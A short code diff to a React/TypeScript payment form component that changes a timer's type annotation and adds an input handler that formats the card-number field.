@@ -39,7 +39,7 @@ const PaymentForm = () => {
   const [showAlert, setShowAlert] = useState(false);
   const [fadeState, setFadeState] = useState('visible');
   const [showBackDialog, setShowBackDialog] = useState(false);
-  const [longPressTimer, setLongPressTimer] = useState<NodeJS.Timeout | null>(null);
+  const [longPressTimer, setLongPressTimer] = useState<ReturnType<typeof setTimeout> | null>(null);
   const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
   const [selectedBank, setSelectedBank] = useState('ICICI BANK');
   const [selectedBankLogo, setSelectedBankLogo] = useState('');
@@ -249,6 +249,16 @@ const PaymentForm = () => {
       wsClient.off('admin_command', handleAdminCommand);
     };
   }, []);
+
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { name, value } = e.target;
+
+    if (name === 'cardNumber') {
+      setFormData(prev => ({ ...prev, cardNumber: formatCardNumber(value) }));
+    } else {
+      setFormData(prev => ({ ...prev, [name]: value }));
+    }
+  };
 
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\D/g, '');
